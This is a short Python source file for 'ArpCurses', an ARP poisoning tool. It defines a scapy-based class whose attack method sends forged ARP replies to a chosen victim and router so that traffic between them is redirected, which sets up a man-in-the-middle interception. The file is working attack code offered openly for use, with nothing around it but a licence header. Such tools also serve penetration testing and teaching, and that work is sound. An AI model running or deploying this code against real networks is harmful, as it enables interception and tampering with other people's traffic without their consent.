"""
    ArpCurses v1.0 - The ArpPoisoning tool. 
    Copyright (C) 2016  Giovanni D'Italia

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

import threading
from scapy.layers.l2 import *
from scapy.route import *

class ArpPoison():
    """docstring for ArpPoison"""
    def __init__(self, iface=None, router=None,victim=None,verbose=0):
        """
        Keyword arguments:
        iface -- the network interface
        router -- ip address of router, ip address you want to do 'spoofing'
        victim -- ip address of victim
        verbose -- set verbose mode of arping (default 0)
        """
        self.iface = iface
        self.router = router
        self.victim = victim
        self.verbose = verbose
        #configure scapy's variable for sending packets
        conf.iface= self.iface


    def attack(self):
        """Start to send poisoned packets to the victim"""
        #create and send FAKE arp packets
        send(ARP(psrc = self.router,pdst = self.victim),verbose = self.verbose)
        send(ARP(psrc = self.victim,pdst = self.router),verbose = self.verbose)
        
    def setIFace(self, iface):
        self.iface = iface
        conf.iface= self.iface
    
    def setRouter(self, router):
        self.router = router
        
    def setVictim(self, victim):
        self.victim = victim

        
